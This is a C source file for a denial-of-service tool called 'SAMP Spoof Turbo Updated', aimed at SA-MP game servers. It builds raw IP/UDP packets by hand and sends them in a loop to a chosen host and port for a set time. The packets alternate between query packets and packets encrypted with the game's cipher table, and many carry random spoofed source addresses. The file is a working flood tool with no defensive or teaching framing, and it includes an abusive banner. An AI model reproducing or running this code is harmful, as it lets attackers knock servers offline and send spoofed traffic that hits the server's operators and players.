#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>           // close()
#include <string.h>           // strcpy, memset(), and memcpy()

#include <netdb.h>            // struct addrinfo
#include <sys/types.h>        // needed for socket()
#include <sys/socket.h>       // needed for socket()
#include <netinet/in.h>       // IPPROTO_RAW, IPPROTO_IP, IPPROTO_UDP
#include <netinet/ip.h>       // struct ip and IP_MAXPACKET (which is 65535)
#include <netinet/udp.h>      // struct udphdr
#include <arpa/inet.h>        // inet_pton() and inet_ntop()
#include <sys/ioctl.h>        // macro ioctl is defined
#include <bits/ioctls.h>      // defines values for argument "request" of ioctl.
#include <sys/time.h>		  // gettimeofday

#include <errno.h>            // errno, perror()

unsigned char sampEncrTable[256] =
{
	0x27, 0x69, 0xFD, 0x87, 0x60, 0x7D, 0x83, 0x02, 0xF2, 0x3F, 0x71, 0x99, 0xA3, 0x7C, 0x1B, 0x9D,
	0x76, 0x30, 0x23, 0x25, 0xC5, 0x82, 0x9B, 0xEB, 0x1E, 0xFA, 0x46, 0x4F, 0x98, 0xC9, 0x37, 0x88,
	0x18, 0xA2, 0x68, 0xD6, 0xD7, 0x22, 0xD1, 0x74, 0x7A, 0x79, 0x2E, 0xD2, 0x6D, 0x48, 0x0F, 0xB1,
	0x62, 0x97, 0xBC, 0x8B, 0x59, 0x7F, 0x29, 0xB6, 0xB9, 0x61, 0xBE, 0xC8, 0xC1, 0xC6, 0x40, 0xEF,
	0x11, 0x6A, 0xA5, 0xC7, 0x3A, 0xF4, 0x4C, 0x13, 0x6C, 0x2B, 0x1C, 0x54, 0x56, 0x55, 0x53, 0xA8,
	0xDC, 0x9C, 0x9A, 0x16, 0xDD, 0xB0, 0xF5, 0x2D, 0xFF, 0xDE, 0x8A, 0x90, 0xFC, 0x95, 0xEC, 0x31,
	0x85, 0xC2, 0x01, 0x06, 0xDB, 0x28, 0xD8, 0xEA, 0xA0, 0xDA, 0x10, 0x0E, 0xF0, 0x2A, 0x6B, 0x21,
	0xF1, 0x86, 0xFB, 0x65, 0xE1, 0x6F, 0xF6, 0x26, 0x33, 0x39, 0xAE, 0xBF, 0xD4, 0xE4, 0xE9, 0x44,
	0x75, 0x3D, 0x63, 0xBD, 0xC0, 0x7B, 0x9E, 0xA6, 0x5C, 0x1F, 0xB2, 0xA4, 0xC4, 0x8D, 0xB3, 0xFE,
	0x8F, 0x19, 0x8C, 0x4D, 0x5E, 0x34, 0xCC, 0xF9, 0xB5, 0xF3, 0xF8, 0xA1, 0x50, 0x04, 0x93, 0x73,
	0xE0, 0xBA, 0xCB, 0x45, 0x35, 0x1A, 0x49, 0x47, 0x6E, 0x2F, 0x51, 0x12, 0xE2, 0x4A, 0x72, 0x05,
	0x66, 0x70, 0xB8, 0xCD, 0x00, 0xE5, 0xBB, 0x24, 0x58, 0xEE, 0xB4, 0x80, 0x81, 0x36, 0xA9, 0x67,
	0x5A, 0x4B, 0xE8, 0xCA, 0xCF, 0x9F, 0xE3, 0xAC, 0xAA, 0x14, 0x5B, 0x5F, 0x0A, 0x3B, 0x77, 0x92,
	0x09, 0x15, 0x4E, 0x94, 0xAD, 0x17, 0x64, 0x52, 0xD3, 0x38, 0x43, 0x0D, 0x0C, 0x07, 0x3C, 0x1D,
	0xAF, 0xED, 0xE7, 0x08, 0xB7, 0x03, 0xE6, 0x8E, 0xAB, 0x91, 0x89, 0x3E, 0x2C, 0x96, 0x42, 0xD9,
	0x78, 0xDF, 0xD0, 0x57, 0x5D, 0x84, 0x41, 0x7E, 0xCE, 0xF7, 0x32, 0xC3, 0xD5, 0x20, 0x0B, 0xA7
};

unsigned char encrBuffer[4092];

void kyretardizeDatagram(unsigned char *buf, int len, int port, int unk)
{
	//Log("SEND: %d \n%s\n", len, DumpMem(buf, len));
    memcpy(encrBuffer, buf, len);

    unsigned char bChecksum = 0;
    int i;
    for(i = 0; i < len; i++)
    {
        unsigned char bData = buf[i];
        bChecksum ^= (bData&0xAA);
    }
    encrBuffer[0] = bChecksum;

    unsigned char *buf_nocrc = &encrBuffer[1];
    memcpy(buf_nocrc, buf, len);

    unsigned char bPort = port ^ 0xCCCC;
    unsigned char c = 0;
    for(i = 0; i < len; i++)
    {
        unsigned char bCurByte = buf_nocrc[i];
        unsigned char bCrypt = sampEncrTable[bCurByte];
        buf_nocrc[i] = bCrypt;

        if(unk)
        {
			c = bPort ^ bCrypt;
            buf_nocrc[i] = c;

            --unk;
        }
        else
        {
            c = unk ^ bCrypt;
            buf_nocrc[i] = bCrypt;

            unk = 1;
        }
    }
}

#define ID_OPEN_CONNECTION_REQUEST 24
#define NETCODE_OPENCONNLULZ 0x6969

// Define some constants.
#define IP4_HDRLEN 20         // IPv4 header length
#define UDP_HDRLEN  8         // UDP header length, excludes data

// Function prototypes
unsigned short int checksum (unsigned short int *, int);
unsigned short int udp4_checksum (struct ip, struct udphdr, unsigned char *, int);


unsigned long GetTickCount()
 {
	struct timeval tv;
	if( gettimeofday(&tv, NULL) != 0 )
		return 0;
 
	return (tv.tv_sec * 1000) + (tv.tv_usec / 1000);
}

int main (int argc, char **argv)
{
	if (argc != 4) {
		printf("Usage: samp_spoof host port time\n");
		exit(EXIT_FAILURE);
	}
	
	
	printf(" ** SAMP Spoof Turbo Updated ** \nYou're cocksucker!\n\n");		

	int status, datalen = 4, sd, *ip_flags;
	const int on = 1;
	char *target, *dst_ip;
	struct ip iphdr;
	struct udphdr udphdr;
	unsigned char *data, *packet;
	struct addrinfo hints, *res;
	struct sockaddr_in *ipv4, sin;
	void *tmp;
	unsigned endtime = time(NULL) + (unsigned)atoi(argv[3]);

	// Allocate memory for various arrays.

	// Maximum UDP payload size = 65535 - IPv4 header (20 bytes) - UDP header (8 bytes)
	tmp = (unsigned char *) malloc ((IP_MAXPACKET - IP4_HDRLEN - UDP_HDRLEN) * sizeof (unsigned char));
	if (tmp != NULL) {
		data = tmp;
	} else {
		fprintf (stderr, "ERROR: Cannot allocate memory for array 'data'.\n");
		exit (EXIT_FAILURE);
	}
	memset (data, 0, (IP_MAXPACKET - IP4_HDRLEN - UDP_HDRLEN) * sizeof (unsigned char));

	tmp = (unsigned char *) malloc (IP_MAXPACKET * sizeof (unsigned char));
	if (tmp != NULL) {
		packet = tmp;
	} else {
		fprintf (stderr, "ERROR: Cannot allocate memory for array 'packet'.\n");
		exit (EXIT_FAILURE);
	}
	memset (packet, 0, IP_MAXPACKET * sizeof (unsigned char));

	tmp = (char *) malloc (40 * sizeof (char));
	if (tmp != NULL) {
		target = tmp;
	} else {
		fprintf (stderr, "ERROR: Cannot allocate memory for array 'target'.\n");
		exit (EXIT_FAILURE);
	}
	memset (target, 0, 40 * sizeof (char));

	tmp = (char *) malloc (16 * sizeof (char));
	if (tmp != NULL) {
		dst_ip = tmp;
	} else {
		fprintf (stderr, "ERROR: Cannot allocate memory for array 'dst_ip'.\n");
		exit (EXIT_FAILURE);
	}
	memset (dst_ip, 0, 16 * sizeof (char));

	tmp = (int *) malloc (4 * sizeof (int));
	if (tmp != NULL) {
		ip_flags = tmp;
	} else {
		fprintf (stderr, "ERROR: Cannot allocate memory for array 'ip_flags'.\n");
		exit (EXIT_FAILURE);
	}
	memset (ip_flags, 0, 4 * sizeof (int));

	// Destination URL or IPv4 address: you need to fill this out
	strcpy (target, argv[1]);

	// Fill out hints for getaddrinfo().
	memset (&hints, 0, sizeof (struct addrinfo));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_flags = hints.ai_flags | AI_CANONNAME;

	// Resolve target using getaddrinfo().
	if ((status = getaddrinfo (target, NULL, &hints, &res)) != 0) {
		fprintf (stderr, "getaddrinfo() failed: %s\n", gai_strerror (status));
		exit (EXIT_FAILURE);
	}
	ipv4 = (struct sockaddr_in *) res->ai_addr;
	tmp = &(ipv4->sin_addr);
	if (inet_ntop (AF_INET, tmp, dst_ip, 16) == NULL) {
		status = errno;
		fprintf (stderr, "inet_ntop() failed.\nError message: %s", strerror (status));
		exit (EXIT_FAILURE);
	}
	freeaddrinfo (res);

	// IPv4 header

	// IPv4 header length (4 bits): Number of 32-bit words in header = 5
	iphdr.ip_hl = IP4_HDRLEN / sizeof (unsigned long int);

	// Internet Protocol version (4 bits): IPv4
	iphdr.ip_v = 4;

	// Type of service (8 bits)
	iphdr.ip_tos = 0;

	// Total length of datagram (16 bits): IP header + UDP header + datalen
	iphdr.ip_len = htons (IP4_HDRLEN + UDP_HDRLEN + datalen);

	// ID sequence number (16 bits): unused, since single datagram
	iphdr.ip_id = htons (0);

	// Flags, and Fragmentation offset (3, 13 bits): 0 since single datagram

	// Zero (1 bit)
	ip_flags[0] = 0;

	// Do not fragment flag (1 bit)
	ip_flags[1] = 0;

	// More fragments following flag (1 bit)
	ip_flags[2] = 0;

	// Fragmentation offset (13 bits)
	ip_flags[3] = 0;

	iphdr.ip_off = htons ((ip_flags[0] << 15)
		      + (ip_flags[1] << 14)
		      + (ip_flags[2] << 13)
		      +  ip_flags[3]);

	// Time-to-Live (8 bits): default to maximum value
	iphdr.ip_ttl = 255;

	// Transport layer protocol (8 bits): 17 for UDP
	iphdr.ip_p = IPPROTO_UDP;

	// Destination IPv4 address (32 bits)
	if ((status = inet_pton (AF_INET, dst_ip, &(iphdr.ip_dst))) != 1) {
		fprintf (stderr, "inet_pton() failed.\nError message: %s", strerror (status));
		exit (EXIT_FAILURE);
	}

	// UDP header

	// Destination port number (16 bits): pick a number
	udphdr.dest = htons (atoi(argv[2]));

	// Length of UDP datagram (16 bits): UDP header + UDP data
	udphdr.len = htons (UDP_HDRLEN + datalen);

	// The kernel is going to prepare layer 2 information (ethernet frame header) for us.
	// For that, we need to specify a destination for the kernel in order for it
	// to decide where to send the raw datagram. We fill in a struct in_addr with
	// the desired destination IP address, and pass this structure to the sendto() function.
	memset (&sin, 0, sizeof (struct sockaddr_in));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = iphdr.ip_dst.s_addr;

	// Submit request for a raw socket descriptor.
	if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror ("socket() failed ");
		exit (EXIT_FAILURE);
	}

	// Set flag so socket expects us to provide IPv4 header.
	if (setsockopt (sd, IPPROTO_IP, IP_HDRINCL, &on, sizeof (on)) < 0) {
		perror ("setsockopt() failed to set IP_HDRINCL ");
		exit (EXIT_FAILURE);
	}

	srand(time(NULL));
	
	int iPort = atoi(argv[2]);
	char c[3];
	c[0] = ID_OPEN_CONNECTION_REQUEST;
	/**(short*)&c[1] = 1234;// ^ NETCODE_OPENCONNLULZ;
	kyretardizeDatagram(c, sizeof(c), iPort, 0);
	
	memcpy(data, encrBuffer, datalen);

	// Finally, add the UDP data.
	memcpy (packet + IP4_HDRLEN + UDP_HDRLEN, data, datalen);*/

	printf("Flooding... %s:%d \n", dst_ip, iPort);
	//printf("endtime: %u, currenttime %u, argv: %u\n", endtime, time(NULL), atoi(argv[3]));
	int typea = 0;
	while ( time(NULL) < endtime )
	{
		if(typea == 0)
		{
			datalen = 15;
			memcpy(data, "SAMP", 4);
			*(unsigned int*)(data + 4) = inet_addr(dst_ip);
			*(unsigned short*)(data + 8) = iPort;
			data[10] = 'i';
			*(unsigned int*)(data + 11) = rand() + rand();
			memcpy (packet + IP4_HDRLEN + UDP_HDRLEN, data, datalen);
			typea = 1;
		}
		else if(typea == 1) // incoming
		{
			
			datalen = 4;
			*(short*)&c[1] = rand() % 65000;
			kyretardizeDatagram(c, sizeof(c), iPort, 0);
			
			memcpy(data, encrBuffer, datalen);

			// Finally, add the UDP data.
			memcpy (packet + IP4_HDRLEN + UDP_HDRLEN, data, datalen);
			typea = 0;
		}

		// Source IPv4 address (32 bits)
		iphdr.ip_len = htons (IP4_HDRLEN + UDP_HDRLEN + datalen);
		if(typea == 1) iphdr.ip_src.s_addr = ((rand() << 16) | rand());
		iphdr.ip_ttl = (rand() % 40) + 70;
		
		// IPv4 header checksum (16 bits): set to 0 when calculating checksum
		iphdr.ip_sum = 0;
		iphdr.ip_sum = checksum ((unsigned short int *) &iphdr, IP4_HDRLEN);

		// Source port number (16 bits): pick a number
		udphdr.len = htons (UDP_HDRLEN + datalen);
		udphdr.source = htons (20000 + rand() % 40000);

		// UDP checksum (16 bits)
		udphdr.check = udp4_checksum (iphdr, udphdr, data, datalen);

		// Prepare packet.

		// First part is an IPv4 header.
		memcpy (packet, &iphdr, IP4_HDRLEN);

		// Next part of packet is upper layer protocol header.
		memcpy ((packet + IP4_HDRLEN), &udphdr, UDP_HDRLEN);

		if (sendto (sd, packet, IP4_HDRLEN + UDP_HDRLEN + datalen, 0, (struct sockaddr *) &sin, sizeof (struct sockaddr)) < 0)  {
			perror ("sendto() failed ");
			exit (EXIT_FAILURE);
		}

		//usleep(1000 * 1000);
		//if(!(GetTickCount() % 10)) usleep(1000);
		memset(data, 0, 65000);
		memset(packet, 0, 65000);
	}

	// Close socket descriptor.
	close (sd);

	// Free allocated memory.
	free (data);
	free (packet);
	free (target);
	free (dst_ip);
	free (ip_flags);

	return (EXIT_SUCCESS);
}

// Checksum function
unsigned short int checksum (unsigned short int *addr, int len)
{
	int nleft = len;
	int sum = 0;
	unsigned short int *w = addr;
	unsigned short int answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= sizeof (unsigned short int);
	}

	if (nleft == 1) {
		*(unsigned char *) (&answer) = *(unsigned char *) w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}

// Build IPv4 UDP pseudo-header and call checksum function.
unsigned short int udp4_checksum (struct ip iphdr, struct udphdr udphdr, unsigned char *payload, int payloadlen)
{
	char buf[IP_MAXPACKET];
	char *ptr;
	int chksumlen = 0;
	int i;

	ptr = &buf[0];  // ptr points to beginning of buffer buf

	// Copy source IP address into buf (32 bits)
	memcpy (ptr, &iphdr.ip_src.s_addr, sizeof (iphdr.ip_src.s_addr));
	ptr += sizeof (iphdr.ip_src.s_addr);
	chksumlen += sizeof (iphdr.ip_src.s_addr);

	// Copy destination IP address into buf (32 bits)
	memcpy (ptr, &iphdr.ip_dst.s_addr, sizeof (iphdr.ip_dst.s_addr));
	ptr += sizeof (iphdr.ip_dst.s_addr);
	chksumlen += sizeof (iphdr.ip_dst.s_addr);

	// Copy zero field to buf (8 bits)
	*ptr = 0; ptr++;
	chksumlen += 1;

	// Copy transport layer protocol to buf (8 bits)
	memcpy (ptr, &iphdr.ip_p, sizeof (iphdr.ip_p));
	ptr += sizeof (iphdr.ip_p);
	chksumlen += sizeof (iphdr.ip_p);

	// Copy UDP length to buf (16 bits)
	memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
	ptr += sizeof (udphdr.len);
	chksumlen += sizeof (udphdr.len);

	// Copy UDP source port to buf (16 bits)
	memcpy (ptr, &udphdr.source, sizeof (udphdr.source));
	ptr += sizeof (udphdr.source);
	chksumlen += sizeof (udphdr.source);

	// Copy UDP destination port to buf (16 bits)
	memcpy (ptr, &udphdr.dest, sizeof (udphdr.dest));
	ptr += sizeof (udphdr.dest);
	chksumlen += sizeof (udphdr.dest);

	// Copy UDP length again to buf (16 bits)
	memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
	ptr += sizeof (udphdr.len);
	chksumlen += sizeof (udphdr.len);

	// Copy UDP checksum to buf (16 bits)
	// Zero, since we don't know it yet
	*ptr = 0; ptr++;
	*ptr = 0; ptr++;
	chksumlen += 2;

	// Copy payload to buf
	memcpy (ptr, payload, payloadlen);
	ptr += payloadlen;
	chksumlen += payloadlen;

	// Pad to the next 16-bit boundary
	for (i=0; i<payloadlen%2; i++, ptr++) {
		*ptr = 0;
		ptr++;
		chksumlen++;
	}

	return checksum ((unsigned short int *) buf, chksumlen);
}